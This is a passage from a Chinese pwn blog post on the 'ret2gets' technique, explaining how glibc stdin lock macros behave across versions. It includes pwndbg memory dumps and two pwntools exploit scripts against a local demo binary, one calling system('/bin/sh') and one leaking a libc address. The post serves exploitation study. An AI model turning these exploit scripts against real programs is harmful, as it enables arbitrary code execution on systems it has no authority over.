+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp"># define _IO_flockfile(_fp) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)
+</span></span></span><span class="line"><span class="cl"><span class="cp"># define _IO_funlockfile(_fp) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)-&gt;_lock)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>_IO_lock_lock和_IO_lock_unlock源码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _IO_lock_lock(_name) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">do {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">void *__self = THREAD_SELF;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if ((_name).owner != __self)					      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    lll_lock ((_name).lock, LLL_PRIVATE);				      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        (_name).owner = __self;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    ++(_name).cnt;							      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  } while (0)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_lock_unlock(_name) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">do {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if (--(_name).cnt == 0)						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">        (_name).owner = NULL;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    lll_unlock ((_name).lock, LLL_PRIVATE);				      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  } while (0)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里_name就是_IO_lock_t *lock,在gets下就是IO_stdfile_0_lock</p>
+<p>1注意到_IO_lock_unlock里有一个&ndash;(_name).cnt == 0,如果条件成立就将owner设为NULL,我们通常会利用owner泄露libc地址，所以这不是我们想看到的</p>
+<p>2如果利用puts泄露地址，owner之前不能出现\x00</p>
+<p>3 同1，由于&ndash;cnt，所以我们输入的第五字节(cnt)会被-1</p>
+<h2 id="利用方法">利用方法
+</h2><p>2.30-2.36</p>
+<p>如果我们想利用puts泄露地址那么用以下payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp"># 这里填充 \x00\x00\x00 开头本来就是\x00
+</span></span></span><span class="line"><span class="cl"><span class="cp">#cnt设为0，--cnt整数溢出变为\xff...
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.37及以上</p>
+<p>对_IO_lock_unlock做了修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _IO_lock_lock(_name) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">do {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">void *__self = THREAD_SELF;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if (SINGLE_THREAD_P &amp;&amp; (_name).owner == NULL)			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).lock = LLL_LOCK_INITIALIZER_LOCKED;			      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).owner = __self;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">else if ((_name).owner != __self)					      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    lll_lock ((_name).lock, LLL_PRIVATE);				      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).owner = __self;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">else								      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      ++(_name).cnt;							      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  } while (0)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define _IO_lock_unlock(_name) \
+</span></span></span><span class="line"><span class="cl"><span class="cp">do {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">if (SINGLE_THREAD_P &amp;&amp; (_name).cnt == 0)				      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).owner = NULL;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).lock = 0;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">else if ((_name).cnt == 0)						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      {									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    (_name).owner = NULL;						      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">    lll_unlock ((_name).lock, LLL_PRIVATE);				      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      }									      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">else								      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">      --(_name).cnt;							      \
+</span></span></span><span class="line"><span class="cl"><span class="cp">  } while (0)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>cnt!=0时才会&ndash;cnt</p>
+<p>这时我们通过连续两次调用gets解决</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#34;A&#34;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#34;B&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">b</span><span class="s">&#34;CCCC&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一次sendline结果如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">32</span><span class="n">gx</span> <span class="mh">0x7c48ce01ca80</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01ca80</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_0_lock</span><span class="o">&gt;:</span>	<span class="mh">0x4141414000000000</span>	<span class="mh">0x4242424242424242</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01ca90</span> <span class="o">&lt;</span><span class="n">__libc_multiple_threads</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01caa0</span> <span class="o">&lt;</span><span class="n">__attr_list_lock</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cab0</span> <span class="o">&lt;</span><span class="n">init_sigcancel</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cac0</span> <span class="o">&lt;</span><span class="n">__nptl_threads_events</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cad0</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cae0</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01caf0</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb00</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb10</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb20</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb30</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb40</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb50</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb60</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb70</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个A变为了0x40</p>
+<p>然后第二次sendline我们发4个CCCC，由于gets会对输入数据末尾补0使其是一个字符串，导致0x40又被覆盖为\x00</p>
+<p>最后&ndash;cnt后结果如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">32</span><span class="n">gx</span> <span class="mh">0x7c48ce01ca80</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01ca80</span> <span class="o">&lt;</span><span class="n">_IO_stdfile_0_lock</span><span class="o">&gt;:</span>	<span class="mh">0x414140ff43434343</span>	<span class="mh">0x00007c48ce07f740</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01ca90</span> <span class="o">&lt;</span><span class="n">__libc_multiple_threads</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01caa0</span> <span class="o">&lt;</span><span class="n">__attr_list_lock</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cab0</span> <span class="o">&lt;</span><span class="n">init_sigcancel</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cac0</span> <span class="o">&lt;</span><span class="n">__nptl_threads_events</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cad0</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cae0</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01caf0</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb00</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb10</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">48</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb20</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb30</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb40</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb50</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb60</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x7c48ce01cb70</span> <span class="o">&lt;</span><span class="n">__pthread_keys</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;:</span>	<span class="mh">0x0000000000000000</span>	<span class="mh">0x0000000000000000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也绕过了检查</p>
+<p>如果我们想控制rdi为binsh的话，由于&ndash;cnt的机制</p>
+<p>我们payload可以如下设置</p>
+<p>b&rsquo;/bin&rsquo;+p8(u8(b&quot;/&quot;)+1)+b&rsquo;sh'</p>
+<p>最后一个要注意的地方，如果在程序结束时rdi!=_IO_stdfile_o_lock的话，我们只需先自己调用一次gets即可</p>
+<p>对于最初的demo</p>
+<p>直接拿shell exp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl"><span class="nv">p</span><span class="o">=</span>process<span class="o">(</span><span class="s1">&#39;./pwn&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">context.log_level<span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">context.arch<span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = gdb.debug(&#39;./demo&#39;, gdbscript=&#39;b *0x40117D\ncontinue&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">elf</span><span class="o">=</span>ELF<span class="o">(</span><span class="s1">&#39;./pwn&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p,&#39;b *0x40117D\nc&#39;)</span>
+</span></span><span class="line"><span class="cl">p.recvuntil<span class="o">(</span>b<span class="s1">&#39;ret2gets\n&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pay</span><span class="o">=</span>b<span class="s1">&#39;a&#39;</span>*0x20+p64<span class="o">(</span>0<span class="o">)</span>+p64<span class="o">(</span>elf.plt<span class="o">[</span><span class="s1">&#39;gets&#39;</span><span class="o">])</span>+p64<span class="o">(</span>elf.plt<span class="o">[</span><span class="s1">&#39;system&#39;</span><span class="o">])</span>
+</span></span><span class="line"><span class="cl">p.sendline<span class="o">(</span>pay<span class="o">)</span>
+</span></span><span class="line"><span class="cl">p.sendline<span class="o">(</span>b<span class="s1">&#39;/bin&#39;</span>+p8<span class="o">(</span>u8<span class="o">(</span>b<span class="s2">&#34;/&#34;</span><span class="o">)</span>+1<span class="o">)</span>+b<span class="s1">&#39;sh&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">p.interactive<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>泄露libc的话,exp如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl"><span class="nv">p</span><span class="o">=</span>process<span class="o">(</span><span class="s1">&#39;./pwn&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">context.log_level<span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">context.arch<span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = gdb.debug(&#39;./demo&#39;, gdbscript=&#39;b *0x40117D\ncontinue&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">elf</span><span class="o">=</span>ELF<span class="o">(</span><span class="s1">&#39;./pwn&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p,&#39;b *0x40117D\nc&#39;)</span>
+</span></span><span class="line"><span class="cl">p.recvuntil<span class="o">(</span>b<span class="s1">&#39;ret2gets\n&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pay</span><span class="o">=</span>b<span class="s1">&#39;a&#39;</span>*0x20+p64<span class="o">(</span>0<span class="o">)</span>+p64<span class="o">(</span>elf.plt<span class="o">[</span><span class="s1">&#39;gets&#39;</span><span class="o">])</span>+p64<span class="o">(</span>elf.plt<span class="o">[</span><span class="s1">&#39;puts&#39;</span><span class="o">])</span>+p64<span class="o">(</span>elf.sym<span class="o">[</span><span class="s1">&#39;main&#39;</span><span class="o">])</span>
+</span></span><span class="line"><span class="cl">p.sendline<span class="o">(</span>pay<span class="o">)</span>
+</span></span><span class="line"><span class="cl">p.sendline<span class="o">(</span>b<span class="s1">&#39;AAAA&#39;</span>+b<span class="s1">&#39;\x00\x00\x00&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">p.recvuntil<span class="o">(</span>b<span class="s1">&#39;\xff&#39;</span>*4<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">libcbase</span><span class="o">=</span>u64<span class="o">(</span>p.recv<span class="o">(</span>6<span class="o">)</span>.ljust<span class="o">(</span>8,b<span class="s1">&#39;\x00&#39;</span><span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#没减偏移</span>
+</span></span><span class="line"><span class="cl">print<span class="o">(</span>hex<span class="o">(</span>libcbase<span class="o">))</span>
+</span></span><span class="line"><span class="cl">p.interactive<span class="o">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/image/ret2gets/res.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="res"
+	
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-apple2/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_apple2.jpg" loading="lazy" data-key="" data-hash="/image/House_of_apple2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of apple2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-apple1/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_apple1.jpg" loading="lazy" data-key="" data-hash="/image/House_of_apple1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of apple1</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-obstack/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_obstack.jpg" loading="lazy" data-key="" data-hash="/image/House_of_obstack.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of obstack</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-pig/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_pig.png" loading="lazy" data-key="" data-hash="/image/House_of_pig.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of pig</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/largebin-attack/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/Largebin/Largebin_attack.jpg" loading="lazy" data-key="" data-hash="/image/Largebin/Largebin_attack.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Largebin Attack</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 FuGuang&#39;s Bolg
+    </section>
+    
+    <section class="powerby">
+        
+        
+
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        共生产 19 篇文章，约 39.77k 字使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
